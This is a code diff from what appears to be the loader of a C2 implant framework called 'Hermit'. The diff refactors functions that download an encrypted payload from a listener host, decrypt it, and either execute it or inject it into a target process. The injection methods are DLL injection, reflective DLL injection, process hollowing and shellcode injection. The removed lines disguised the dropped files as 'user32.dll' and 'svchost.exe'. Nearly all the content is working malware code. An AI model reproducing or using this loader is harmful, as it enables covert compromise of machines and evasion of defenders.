@@ -56,110 +56,10 @@ namespace Hermit
         return pState;
     }
 
-    VOID DLLLoader()
-    {        
-        State::PSTATE pState = Init();
-        if (!pState)
-        {
-            return;
-        }
-
-        // Set the temp file path
-        std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
-        std::wstring dllPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + dllFileName;
-        size_t dwDllPathSize = (dllPath.size() + 1) * sizeof(wchar_t);
-
-        // Download a DLL file
-        if (!System::Http::FileDownload(
-            pState->pProcs,
-            pState->pCrypt,
-            pState->hConnect,
-            pState->lpListenerHost,
-            pState->nListenerPort,
-            pState->lpReqPathDownload,
-            L"Content-Type: application/json\r\n",
-            std::wstring(pState->lpInfoJSON),
-            dllPath
-        )) {
-            State::Free(pState);
-            return;
-        }
-
-        // Target PID to be injected DLL.
-        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
-
-        // Inject DLL
-        if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
-        {
-            Technique::Injection::DLLInjection(
-                pState->pProcs,
-                dwTargetPID,
-                (LPVOID)dllPath.c_str(),
-                dwDllPathSize
-            );
-        }
-        else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
-        {
-            Technique::Injection::ReflectiveDLLInjection(
-                pState->pProcs,
-                dwTargetPID,
-                dllPath.c_str()
-            );
-        }
-
-        State::Free(pState);
-        return;
-    }
-
-    VOID ExecLoader()
+    std::vector<BYTE> Download(State::PSTATE pState)
     {
-        State::PSTATE pState = Init();
-        if (!pState)
-        {
-            return;
-        }
-
-        // Set the temp file path
-        std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
-        std::wstring execPath = System::Env::GetStrings(L"%TEMP%") + L"\\" + execFileName;
-
-        // Download an executable
-        if (!System::Http::FileDownload(
-            pState->pProcs,
-            pState->pCrypt,
-            pState->hConnect,
-            pState->lpListenerHost,
-            pState->nListenerPort,
-            pState->lpReqPathDownload,
-            L"Content-Type: application/json\r\n",
-            std::wstring(pState->lpInfoJSON),
-            execPath
-        )) {
-            State::Free(pState);
-            return;
-        }
-
-        // Execute
-        if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
-        {
-            System::Process::ExecuteFile(pState->pProcs, execPath);
-        }
-
-        State::Free(pState);
-        return;
-    }
-
-    VOID ShellcodeLoader()
-    {
-        State::PSTATE pState = Init();
-        if (!pState)
-        {
-            return;
-        }
-
         std::string sInfoJSON = Utils::Convert::UTF8Encode(std::wstring(pState->lpInfoJSON));
 
-        // Download shellcode
         System::Http::WinHttpResponse resp = System::Http::RequestSend(
             pState->pProcs,
             pState->hConnect,
@@ -173,28 +73,102 @@ namespace Hermit
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            State::Free(pState);
-            return;
+            return std::vector<BYTE>();
         }
 
         std::wstring wEnc = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
         if (wEnc.length() == 0)
         {
-            State::Free(pState);
-            return;
+            return std::vector<BYTE>();
         }
 
         // Decrypt the data
         std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pState->pCrypt->pAES->hKey, pState->pCrypt->pAES->iv);
+        return bytes;
+    }
 
-        // Target PID
-        DWORD dwPID;
+    VOID DLLLoader()
+    {        
+        State::PSTATE pState = Init();
+        if (!pState)
+            return;
+
+        // Download DLL
+        std::vector<BYTE> bytes = Download(pState);
+        if (bytes.empty())
+        {
+            State::Free(pState);
+            return;
+        }
+
+        // Target PID to be injected DLL.
+        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+
+        // Inject DLL
+        if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
+        {
+            Technique::Injection::DLLInjection(pState->pProcs, dwTargetPID, bytes);
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
+        {
+            Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dwTargetPID, bytes);
+        }
+
+        State::Free(pState);
+        return;
+    }
+
+    VOID PELoader()
+    {
+        State::PSTATE pState = Init();
+        if (!pState)
+            return;
+
+        // Download PE
+        std::vector<BYTE> bytes = Download(pState);
+        if (bytes.empty())
+        {
+            State::Free(pState);
+            return;
+        }
+
+        // Inject PE
+        if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
+        {
+            Technique::Injection::DirectExecution(pState->pProcs, bytes);
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"process-hollowing") == 0)
+        {
+            Technique::Injection::ProcessHollowing(
+                pState->pProcs,
+                (LPVOID)bytes.data(),
+                pState->lpPayloadProcessToInject
+            );
+        }
+
+        State::Free(pState);
+        return;
+    }
+
+    VOID ShellcodeLoader()
+    {
+        State::PSTATE pState = Init();
+        if (!pState)
+            return;
+
+        // Download shellcode
+        std::vector<BYTE> bytes = Download(pState);
+        if (bytes.empty())
+        {
+            State::Free(pState);
+            return;
+        }
 
         // Inject shellcode
         if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
         {
-            dwPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
-            Technique::Injection::ShellcodeInjection(pState->pProcs, dwPID, bytes);
+            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+            Technique::Injection::ShellcodeInjection(pState->pProcs, dwTargetPID, bytes);
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-fibers") == 0)
         {
